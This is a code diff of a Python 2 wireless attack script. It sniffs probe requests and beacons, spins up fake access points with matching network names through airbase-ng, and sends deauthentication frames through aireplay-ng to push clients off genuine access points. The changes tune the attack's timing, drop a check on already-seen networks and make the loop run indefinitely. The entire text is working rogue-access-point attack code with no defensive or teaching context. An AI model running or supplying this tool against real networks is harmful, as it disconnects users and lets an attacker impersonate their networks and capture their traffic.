@@ -12,8 +12,6 @@ dump_num = 1
 def start_AP(essid, bssid, interface, path, channel):
     try:
         import subprocess
-        print channel
-        print interface + "EBAAAAAAAAAAAAAAA"
         subprocess.check_call(["airmon-ng", "start", interface, channel])
         
         kill = lambda process: process.terminate()
@@ -23,11 +21,11 @@ def start_AP(essid, bssid, interface, path, channel):
             cmd = subprocess.Popen(["airbase-ng", "--essid", essid, "-c", channel, "-F", essid + "_log", "-Z", "4", interface + "mon"])
         else:
             cmd = subprocess.Popen(["airbase-ng", "--essid", essid,"-a", hexlify(bssid), "-c", channel, "-F", essid + "_log", "-Z", "4", interface + "mon"])           
-        timer = threading.Timer(10, kill, [cmd])
+        timer = threading.Timer(3, kill, [cmd])
         try:
             timer.start()
             if (bssid) != b"\xff\xff\xff\xff\xff\xff":
-                subprocess.check_call(["aireplay-ng", "-e", essid, "-a", hexlify(bssid), "--deauth", "5", interface + "mon"])
+                subprocess.check_call(["aireplay-ng", "-e", essid, "-a", hexlify(bssid), "--deauth", "4", interface + "mon"])
             stdout, stderr = cmd.communicate()
         finally:
             timer.cancel()
@@ -41,6 +39,7 @@ def start_AP(essid, bssid, interface, path, channel):
 def monitor(dump, interface, path):
     packet_index = -1
     error_index = 0
+    flag = False
     print "\n" + dump + " file is being investigated\n"
     try:
         while True:
@@ -55,8 +54,8 @@ def monitor(dump, interface, path):
                 # ------------------------------
                 while time()*1000 - start <= 10:
                     packet_index += 1
-                    print str(packet_index) + "     " + str(time()*1000 - start) + "start " + str(start)
-                    if unhexlify(packets[packet_index][1].packet)[0] == b'\x80':    # if the packet is really a beacon
+                    #print str(packet_index) + "     " + str(time()*1000 - start) + "start " + str(start)
+                    if flag == True and unhexlify(packets[packet_index][1].packet)[0] == b'\x80':    # if the packet is really a beacon
                         essid_len = int(unhexlify(packets[packet_index][1].packet)[37].encode("hex"), 16)
                         # ---------
                         if essid_len != 0:
@@ -68,20 +67,18 @@ def monitor(dump, interface, path):
                                 from threading import Thread
                                 bssid = unhexlify((packets[packet_index][1].packet))[16: 22]
                                 rates_len = int(unhexlify(packets[packet_index][1].packet)[38 + essid_len + 1].encode("hex"), 16)
-                                print "rates_len of essid " + current_essid + " is " + str(rates_len)
                                 channel = int(unhexlify((packets[packet_index][1].packet))[38 + essid_len + 1 + rates_len + 1 + 1 + 1].encode("hex"), 16)
-                                print "channel of essid " + current_essid + " is " + str(channel)
                                 #print "\nBSSID: " + str(bssid) + " " + hexlify(bssid) + " of length " + str(len(bssid)) + "\n"
                                 task_AP = Thread(start_AP(current_essid, bssid, interface, path, str(channel)))
                                 task_AP.start()
                         # ---------
                     
-                    elif unhexlify(packets[packet_index][1].packet)[0] == b'\x40':  # or if the packet is really a probe
+                    elif flag == False and unhexlify(packets[packet_index][1].packet)[0] == b'\x40':  # or if the packet is really a probe request
                         essid_len = int(unhexlify(packets[packet_index][1].packet)[25].encode("hex"), 16)
                         # ---------
                         if essid_len != 0:
                             current_essid = (unhexlify(packets[packet_index][1].packet)[26: 26 + essid_len]).encode("ascii")
-                            if (unhexlify(packets[packet_index][1].packet)[26: 26 + essid_len]) != b'\xff\xff\xff\xff\xff\xff' and not(current_essid in cache):  # if we've already seen this ESSID before
+                            if (unhexlify(packets[packet_index][1].packet)[26: 26 + essid_len]) != b'\xff\xff\xff\xff\xff\xff':  # if we've already seen this ESSID before
                                 print "in "  + str(packet_index + 1) + " ESSID " + current_essid + " found"
                                 cache.append(current_essid)
                                 # ------
@@ -96,7 +93,7 @@ def monitor(dump, interface, path):
 
             except IOError:
                 print "File is not ready yet...\n"
-                sleep(1)
+                sleep(2)
                 # --------
                 if error_index == 15:
                     print "\nWaited too long, trying to scan the next file\n"
@@ -105,8 +102,12 @@ def monitor(dump, interface, path):
                 error_index += 1
 
             except IndexError:
-                print "Scan is done\n"
-                break
+                if flag == True:
+                    print "Scan is done\n"
+                    break
+                else:
+                    flag = True
+                    packet_index = -1
 
             except Exception,e:
                 t = 10
@@ -137,7 +138,6 @@ def timeout(p):
 def start_mon(interface, path):
     import os
     os.chdir(path + "/dumps/")
-    print os.getcwd() + " mon"
     i = 0
     from random import randint
     subprocess.call(["airmon-ng", "start", interface, str(randint(1, 14))])
@@ -146,7 +146,7 @@ def start_mon(interface, path):
 			os.chdir(path + "/dumps/")
 			kill = lambda process: process.terminate()
 			cmd = subprocess.Popen(["airodump-ng", interface + "mon", "--beacons", "--write", "beac_dump"])
-			timer = threading.Timer(2, kill, [cmd])
+			timer = threading.Timer(5, kill, [cmd])
 			try:
 				timer.start()
 				stdout, stderr = cmd.communicate()
@@ -184,7 +184,7 @@ if __name__ == "__main__":
             print str(e)
     	# ----------------------
     	itera = 0
-    	while itera <= 2:
+    	while True:
 	        import os
 	    	cwd = os.getcwd()
         	os.chdir(cwd + "/dumps/")
